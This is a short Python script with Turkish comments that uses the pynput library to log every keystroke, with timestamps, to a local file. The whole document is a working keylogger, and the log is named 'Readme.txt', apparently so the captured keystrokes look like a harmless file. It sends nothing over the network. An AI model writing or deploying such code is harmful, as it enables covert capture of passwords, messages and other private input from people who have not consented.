from pynput.keyboard import Key, Listener #yerel kütüphane
import logging #vanilla

log_dir = ""  #log dosyası

logging.basicConfig(filename=(log_dir+ "Readme.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s:")

def on_press(key):
	logging.info(str(key))

with Listener(on_press=on_press) as listener:
	listener.join()